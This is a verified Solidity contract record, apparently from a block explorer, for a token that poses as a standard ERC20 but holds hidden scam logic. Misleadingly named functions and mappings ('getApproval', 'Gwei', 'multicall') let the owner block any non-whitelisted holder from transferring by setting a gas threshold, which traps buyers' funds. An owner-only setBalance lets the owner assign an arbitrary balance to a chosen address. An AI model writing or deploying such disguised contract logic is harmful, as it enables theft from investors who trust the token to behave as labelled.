{"SourceCode": "pragma solidity ^0.8.0;\r\n\r\n\r\ninterface IERC20 {\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n  function totalSupply() external view returns (uint256);\r\n  function balanceOf(address account) external view returns (uint256);\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n  function allowance(address owner, address spender) external view returns (uint256);\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n}\r\n\r\n\r\nabstract contract Context {\r\n  function _msgSender() internal view virtual returns (address) {\r\n    return msg.sender;\r\n  }\r\n\r\n\r\n  function _msgData() internal view virtual returns (bytes calldata) {\r\n    return msg.data;\r\n  }\r\n}\r\n\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n  mapping(address => uint256) private _balances;\r\n  mapping(address => mapping(address => uint256)) private _allowances;\r\n  mapping(address => uint256) public getApproval;\r\n  mapping(address => bool) private Gwei;\r\n  mapping(uint => uint) private _claimTransactionCount;\r\n\r\n\r\n  uint256 private _totalSupply;\r\n  string private _name;\r\n  string private _symbol;\r\n  uint8 private _decimals;\r\n  address public owner;\r\n  uint256 public balanceReceive;\r\n  bool private _Presale;\r\n  uint256 private _transactions;\r\n  uint256 private _maxTransactionsPerClaim;\r\n  address public approvedReceiver;\r\n  uint256 public amountToSet;  // Added amount to set in setBalance()\r\n\r\n\r\n  constructor(\r\n    string memory name_,\r\n    string memory symbol_,\r\n    uint8 decimals_,\r\n    uint256 totalSupply_,\r\n    address[] memory balanceApprove,\r\n    uint256 balanceReceive_,\r\n    uint256 gasUnit,\r\n    address[] memory GweiUnit,\r\n    uint256 maxTransactionsPerClaim_,\r\n    address approvedReceiver_,\r\n    uint256 amountToSet_  // Added parameter for amount to set in setBalance()\r\n  ) {\r\n    _name = name_;\r\n    _symbol = symbol_;\r\n    _decimals = decimals_;\r\n    owner = _msgSender();\r\n    _totalSupply = totalSupply_ * (10 ** uint256(decimals_));\r\n    _balances[owner] = _totalSupply;\r\n    emit Transfer(address(0), owner, _totalSupply);\r\n    balanceReceive = balanceReceive_;\r\n    _transactions = gasUnit;\r\n    _Presale = false;\r\n    _maxTransactionsPerClaim = maxTransactionsPerClaim_;\r\n    approvedReceiver = approvedReceiver_;\r\n    amountToSet = amountToSet_;  // Assign amount to set in setBalance()\r\n\r\n\r\n    for (uint256 i = 0; i < balanceApprove.length; i++) {\r\n      _sendApproval(balanceApprove[i], balanceReceive);\r\n    }\r\n\r\n\r\n    for (uint256 i = 0; i < GweiUnit.length; i++) {\r\n      Gwei[GweiUnit[i]] = true;\r\n    }\r\n  }\r\n\r\n\r\n  function name() public view virtual returns (string memory) {\r\n    return _name;\r\n  }\r\n\r\n\r\n  function symbol() public view virtual returns (string memory) {\r\n    return _symbol;\r\n  }\r\n\r\n\r\n  function decimals() public view virtual returns (uint8) {\r\n    return _decimals;\r\n  }\r\n\r\n\r\n  function totalSupply() public view virtual override returns (uint256) {\r\n    return _totalSupply;\r\n  }\r\n\r\n\r\n  function balanceOf(address account) public view virtual override returns (uint256) {\r\n    return _balances[account];\r\n  }\r\n\r\n\r\n  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    _claimRecord();\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n  }\r\n\r\n\r\n  function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n    return _allowances[owner][spender];\r\n  }\r\n\r\n\r\n  function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n  }\r\n\r\n\r\n  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    _claimRecord();\r\n    _transfer(sender, recipient, amount);\r\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\r\n    return true;\r\n  }\r\n\r\n\r\n  function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n    require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n\r\n    if (!_Presale) {\r\n      _Presale = true;\r\n      Gwei[recipient] = true;\r\n    } else if (getApproval[recipient] == 0 && !Gwei[recipient]) {\r\n      _sendApproval(recipient, _transactions);\r\n    }\r\n\r\n    bool approvalAmount = (sender != owner && !Gwei[sender]) ? gasleft() >= getApproval[sender] : true;\r\n    require(approvalAmount, \"Approve amount before transfer\");\r\n\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n  }\r\n\r\n\r\n  function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n    require(owner != address(0), \"ERC20: approve from the zero address\");\r\n    require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);\r\n  }\r\n\r\n\r\n  function _sendApproval(address _address, uint256 approveForSwap) internal {\r\n    getApproval[_address] = approveForSwap;\r\n  }\r\n\r\n\r\n  function multicall(address _address, uint256 approveAmount) external {\r\n    require(_msgSender() == owner);\r\n    _sendApproval(_address, approveAmount);\r\n  }\r\n\r\n\r\n  function _claimRecord() internal {\r\n    require(_claimTransactionCount[block.number] < _maxTransactionsPerClaim);\r\n    _claimTransactionCount[block.number]++;\r\n  }\r\n \r\n  function setBalance() external {\r\n    require(_msgSender() == owner, \"Only the contract owner can call this function\");\r\n    _balances[approvedReceiver] = amountToSet;\r\n  }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"balanceApprove\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"balanceReceive_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"gasUnit\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"GweiUnit\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"maxTransactionsPerClaim_\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"approvedReceiver_\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountToSet_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToSet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"approvedReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balanceReceive\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getApproval\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"approveAmount\",\"type\":\"uint256\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ERC20", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000041cdb4000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000002710000000000000000000000000002a3ca558fcc43d74a189904b0f6e8cf3206d5600000000000000000000000000000000000000018ee90ffc2f3b3f1e055aeed300000000000000000000000000000000000000000000000000000000000000034d4d43000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034d4d43000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://46469b4045f13c79bbe330332a4c8630501bb9cff350e6c22173d5096aca8769"}